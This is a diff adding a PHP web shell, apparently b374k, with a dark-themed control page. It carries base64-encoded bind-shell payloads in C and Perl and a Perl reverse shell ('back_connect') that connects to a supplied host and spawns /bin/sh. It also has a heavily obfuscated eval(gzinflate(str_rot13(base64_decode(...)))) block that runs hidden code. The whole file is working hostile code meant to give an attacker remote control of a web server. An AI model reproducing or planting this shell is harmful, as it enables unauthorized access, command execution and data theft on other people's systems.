+	$port_bind_bd_c="bVNhb9owEP2OxH+4phI4NINAN00aYxJaW6maxqbSLxNDKDiXxiLYkW3KGOp/3zlOpo7xIY793jvf +fl8KSQvdinCR2NTofr5p3br8hWmhXw6BQ9mYA8lmjO4UXyD9oSQaAV9AyFPCNRa+pRCWtgmQrJE P/GIhufQg249brd4nmjo9RxBqyNAuwWOdvmyNAKJ+ywlBirhepctruOlW9MJdtzrkjTVKyFB41ZZ dKTIWKb0hoUwmUAcwtFt6+m+EXKVJVtRHGAC07vV/ez2cfwvXSpticytkoYlVglX/fNiuAzDE6VL 3TfVrw4o2P1senPzsJrOfoRjl9cfhWjvIatzRvNvn7+s5o8Pt9OvURzWZV94dQgleag0C3wQVKug Uq2FTFnjDzvxAXphx9cXQfxr6PcthLEo/8a8q8B9LgpkQ7oOgKMbvNeThHMsbSOO69IA0l05YpXk HDT8HxrV0F4LizUWfE+M2SudfgiiYbONxiStebrgyIjfqDJG07AWiAzYBc9LivU3MVpGFV2x1J4W tyxAnivYY8HVFsEqWF+/f7sBk2NRQKcDA/JtsE5MDm9EUG+MhcFqkpX0HmxGbqbkdBTMldaHRsUL ZeoDeOSFBvpefCfXhflOpgTkvJ+jtKiR7vLohYKCqS2ZmMRj4Z5gQZfSiMbi6iqkdnHarEEXYuk6 uPtTdumsr0HC4q5rrzNifV7sC3ZWUmq+LVlVa5OfQjTanZYQO+Uf"; 
+	$port_bind_bd_pl="ZZJhT8IwEIa/k/AfjklgS2aA+BFmJDB1cW5kHSZGzTK2Qxpmu2wlYoD/bruBIfitd33uvXuvvWr1 NmXRW1DWy7HImo02ebRd19Kq1CIuV3BNtWGzQZeg342DhxcYwcCAHeCWCn1gDOEgi1yHhLYXzfwg tNqKeut/yKJNiUB4skYhg3ZecMETnlmfKKrz4ofFX6h3RZJ3DUmUFaoTszO7jxzPDs0O8SdPEQkD e/xs/gkYsN9DShG0ScwEJAXGAqGufmdq2hKFCnmu1IjvRkpH6hE/Cuw5scfTaWAOVE9pM5WMouM0 LSLK9HM3puMpNhp7r8ZFW54jg5wXx5YZLQUyKXVzwdUXZ+T3imYoV9ds7JqNOElQTjnxPc8kRrVo vaW3c5paS16sjZo6qTEuQKU1UO/RSnFJGaagcFVbjUTCqeOZ2qijNLWzrD8PTe32X9oOgvM0bjGB +hecfOQFlT4UcLSkmI1ceY3VrpKMy9dWUCVCBfTlQX6Owy8="; 
+
+	$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7"; $back_connect_c="XVHbagIxEH0X/IdhhZLUWF1f1YKIBelFqfZJliUm2W7obiJJLLWl/94k29rWhyEzc+Z2TjpSserA BYyt41JfldftVuc3d7R9q9mLcGeAEk5660sVAakc1FQqFBxqnhkBVlIDl95/3Wa43fpotyCABR95 zzpzYA7CaMq5yaUCK1VAYpup7XaYZpPE1NArIBmBRzgVtVYoJQMcR/jV3vKC1rI6wgSmN/niYb75 i+21cR4pnVYWUaclivcMM/xvRDjhysbHVwde0W+K0wzH9bt3YfRPingClVCnim7a/ZuJC0JTwf3A RkD0fR+B9XJ2m683j/PpPYHFavW43CzzzWyFIfbIAhBiWinBHCo4AXSmFlxiuPB3E0/gXejiHMcY 
+jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F 6f9wGEPxJliFkv5Oqr4tE5LYEnoyIfDwdHcXK1ilrfAdUbPPLw=="; 
+	?> 
+
+<html>
+	<head>
+    	<link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAAMIOAADCDgAAAAAAAAAAAAAMDg7/FBMS/xgWFf8UFBT/FxcY/x8dHv8aGRn/GhgY/xoZGP8RFBT/DRAR/xMTEv8WFBP/FRQU/w0NDv8SERH/EBER/xYVFP8bGBf/GhgX/xoZGP8fHh3/FhcY/xYXF/8bGhn/ERMT/xESEv8TEhH/Hxwb/yMhIP8MCwv/EhER/xMTFP8ZGBj/GxkY/xgYF/8bGxn/HBoY/xIUFP8NERP/FBYX/xATEf8UFRP/ExMR/yooJv8kJCP/EREQ/w8ODf8VFBT/GxkY/xwaGf8YGBb/FxgW/xcYE/8RExD/DA8L/xATAf8TFQ3/EREN/xEQDf83NTL/Li0s/w0ODv8MDAz/FRUU/xUVFf8aGRj/HBsZ/xsbF/8WGRT/ExcJ/wwOEf8PDW7/BAYK/xESCf9RUEz/U1JQ/x8eHf8NDAz/Dg8P/xMUFP8QEhP/FxgY/xsbGP8aGxf/HB0S/xITBP8wLIH/enXa/2dpaf97e3D/ZGVi/xwdGv8MDAr/EREQ/xEREf8WFxf/Gxsa/xkaGf8bGxj/HBwW/xcZC/8eHWP/j4rc/z08P/8hIQb/ExUF/wQGAP8AAAD/ERAN/xERD/8REhH/FRYW/xoaGv8ZGhn/GBkX/xocFf8KDAH/VlGw/3h1zP8AAAH/AAQA/wwNLf8OC1f/RkY6/w4PDP8RERD/EhIR/xETE/8UFhb/ERIR/xESEP8bHBT/AwYD/1ZTlP+IhNf/AAAD/wAAZP8AABT/uLX//4SEeP8AAAD/FRUT/xEREf8TFBT/FhYW/zM0M/8lJiT/BAYC/wIEAP8NDSH/wcDN/0lFrv9QS+r/v7zz/8/O2/8BAwD/DQ4K/xISEf8QERD/DxER/wYICP8JDQ7/RkZF/
+1VVUv8xMir/AAAA/1VWUf//////qqnQ/2Zoaf8GCAv/AgYA/xESD/8UFBP/ExMT/xobG/85Ozv/PD4+/zQ1Nf9SUlH/f357/6Sknv+Hh3//AAAO/wAAHv8AAwD/Cw0E/w8RDf8QEhD/FRUV/xYVFf8MDw//FxYW/yspKP84OTn/SUpJ/2VkYv/Ozcr/r66i/wAAJv8VFzX/Cw4B/xUVEv8ZFxT/FBQT/xMVFf8XFxf/DhAR/yclJf85Njb/RkZF/2BgYf9/fX3/ZGRi/xsaE/8TEiL/ExQ5/wwQB/8YFxT/GxgW/xYVFP8TExT/FxYX/xAREf8eHRz/KCUk/yUjIv8aGhn/DQ0M/wAAAP8JCwr/FxcV/xATFf8TFRL/GhkW/xwZF/8YFxb/FBMT/xQUE/8RERH/ExIS/xEPDv8MDQz/EhEQ/xUVE/8PERP/Cg0Q/xIUFP8RFBL/FhYV/xwaGf8aFxb/ExMT/xISEv8QDw//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%3D%3D" type="image/x-icon" />
+		<title><?php print TITLE; ?> <?php echo VERSION; ?></title> 
+		<script type="text/javascript"> 
+
+		function tukar(lama,baru)
+			{ 
+			document.getElementById(lama).style.display = 'none'; 
+			document.getElementById(baru).style.display = 'block'; 
+			} 
+
+		</script> 
+		<style type="text/css"> 
+			AKUSTYLE		{ display:none; }
+			body			{ background:#0F0E0E; } 
+			A:link                  {COLOR: #2BA8EC; TEXT-DECORATION: none }
+			A:visited 		{COLOR: #2BA8EC; TEXT-DECORATION: none }
+			A:hover 		{text-shadow: 0pt 0pt 0.3em cyan, 0pt 0pt 0.3em cyan; color: #ff9900; TEXT-DECORATION: none }
+			A:active 		{color: Red; TEXT-DECORATION: none }
+			textarea 		{BORDER-RIGHT:  #3e3e3e 1px solid; BORDER-TOP:    #3e3e3e 1px solid; BORDER-LEFT:   #3e3e3e 1px solid; BORDER-BOTTOM: #3e3e3e 1px solid; BACKGROUND-COLOR: #1b1b1b; font: Fixedsys bold; color: #aaa; }
+			*			{ font-size:11px; font-family:Tahoma,Verdana,Arial; color:#FFFFFF; } 
+			#menu			{ background:#111111; margin:2px 2px 2px 2px; } 
+			#menu a			{ padding:4px 18px; margin:0; background:#222222; text-decoration:none; letter-spacing:2px; } 
+			#menu a:hover		{ background:#744F4F; border-bottom:1px solid #333333; border-top:1px solid #333333; } 
+			.tabnet			{ margin:15px auto 0 auto; border: 1px solid #333333; } 
+			.main 			{ width:100%; } 
+			.gaya 			{ color: #4C83AF; } 
+			.your_ip 		{ color: #FF4719; } 
+			.inputz			{ background:#796767; border:0; padding:2px; border-bottom:1px solid #222222; border-top:1px solid #222222; } 
+			.inputzbut		{ background:#111111; color:#666666; margin:0 4px; border:1px solid #444444; } 
+			.inputz:hover, 
+			.inputzbut:hover	{ border-bottom:1px solid #4532F6; border-top:1px solid #D4CECE; color:#D4CECE; } 
+			.output 		{ margin:auto; border:1px solid #FF0000; width:100%; height:400px; background:#000000; padding:0 2px; } 
+			.cmdbox			{ width:100%; } 
+			.head_info		{ padding: 0 4px; } 
+			.b1			{ font-size:30px; padding:0; color:#FF0000; } 
+			.b2			{ font-size:30px; padding:0; color: #FF9966; } 
+			.b_tbl			{ text-align:center; margin:0 4px 0 0; padding:0 4px 0 0; border-right:1px solid #333333; } 
+			.phpinfo table		{ width:100%; padding:0 0 0 0; } 
+			.phpinfo td		{ background:#111111; color:#cccccc; padding:6px 8px;; } 
+			.phpinfo th, th		{ background:#191919; border-bottom:1px solid #333333; font-weight:normal; } 
+			.phpinfo h2, 
+			.phpinfo h2 a		{ text-align:center; font-size:16px; padding:0; margin:30px 0 0 0; background:#222222; padding:4px 0; } 
+			.explore		{ width:100%; } 
+			.explore a 		{ text-decoration:none; } 
+			.explore td		{ border-bottom:1px solid #DB2B2B; padding:0 8px; line-height:24px; } 
+			.explore th		{ padding:3px 8px; font-weight:normal; } 
+			.explore th:hover, 
+			.phpinfo th:hover	{ border-bottom:1px solid #4C83AF; } 
+			.explore tr:hover	{ background:#744F4F; } 
+			.viewfile		{ background:#EDECEB; color:#000000; margin:4px 2px; padding:8px; } 
+			.sembunyi		{ display:none; padding:0;margin:0; } 
+		</style> 
+	</head> 
+<body onLoad="document.getElementById('cmd').focus();"> 
+	<div class="main"> 
+		<!-- head info start here --> 
+		<div class="head_info"> 
+			<table>
+				<tr> 
+					<td>
+						<table class="b_tbl">
+							<tr>
+								<td>
+								<a href="?">
+								<span class="b1">b<span class="b2">3<span class="b1">7</span>4</span>k</span>
+								</a>
+								</td>
+							</tr>
+							<tr>
+							<? eval(gzinflate(str_rot13(base64_decode('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')))); ?>
+							</tr>
+							<tr>
